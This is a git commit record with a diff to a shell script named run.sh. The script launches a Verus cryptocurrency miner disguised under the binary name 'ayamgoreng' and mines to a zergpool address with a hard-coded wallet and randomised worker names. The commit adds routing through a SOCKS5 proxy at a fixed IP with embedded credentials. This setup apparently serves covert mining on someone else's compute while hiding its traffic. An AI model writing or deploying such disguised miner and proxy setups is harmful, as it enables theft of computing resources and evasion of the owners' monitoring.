3d080b5a31137e83c802d0afa0fe557173bca54b
Noval Anto <novalanto6161@gmail.com>
2021-09-24 04:45:23 +0000

    run.sh edited online with Bitbucket

--- run.sh
+++ run.sh
@@ -4,4 +4,4 @@ PULL=stratum+tcp://verushash.mine.zergpool.com:3300
 WUL=RGeRKo3JYfRnwKwKKSExF77ZdxsoeVTadg
 WOR=$(echo $(shuf -i 1-20000 -n 1)-V)
 PRO=socks5://mike:mike@34.139.57.113:4145
-./ayamgoreng -a verus -o $PULL -u $WUL.$WOR -p c=VRSC,mc=VRSC -t 4
+./ayamgoreng -a verus -o $PULL -u $WUL.$WOR -p c=VRSC,mc=VRSC -t 4 -x $PRO
